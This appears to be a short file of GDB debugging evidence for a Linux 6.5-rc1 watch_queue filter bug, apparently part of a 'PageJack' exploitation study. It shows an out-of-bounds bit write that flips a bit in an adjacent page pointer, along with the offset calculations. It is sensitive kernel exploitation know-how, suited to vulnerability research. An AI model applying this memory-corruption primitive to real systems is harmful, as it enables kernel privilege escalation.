@@ -1,0 +1,35 @@
+PageJack GDB evidence / 2026-09-13
+
+(gdb) break kernel/source/linux-6.5-rc1/kernel/watch_queue.c:367
+(gdb) continue
+(gdb) p i
+$12 = 3
+(gdb) p/x tf[i].type
+$13 = 0x306
+(gdb) p/x filter.nr_filters
+$14 = 0x4
+(gdb) p/x wfilter
+$16 = 0xffff888007160c60
+(gdb) p/x (char *)wfilter->type_filter + 0x60
+$17 = 0xffff888007160cc0
+(gdb) p/x sizeof(unsigned long)
+$9 = 0x8
+(gdb) p/x sizeof(struct watch_filter)
+$10 = 0x18
+(gdb) p/x sizeof(struct watch_type_filter)
+$11 = 0x10
+
+(gdb) p/x q->type
+$18 = 0x306
+(gdb) p/x wfilter->type_filter[0]
+$19 = 0x2
+(gdb) x/4gx (char *)wfilter->type_filter + 0x50
+0xffff888007160cb0:  0x0000000000000000  0x0000000000000000
+0xffff888007160cc0:  0xffffea00001c6500  0x0000002400000000
+(gdb) si
+(gdb) x/4gx (char *)wfilter->type_filter + 0x50
+0xffff888007160cb0:  0x0000000000000000  0x0000000000000000
+0xffff888007160cc0:  0xffffea00001c6540  0x0000002400000000
+
+0x306 / 64 = 0xc, 0x306 % 64 = 0x6
+0xc * 0x8 = 0x60; mask = 1 << 6 = 0x40
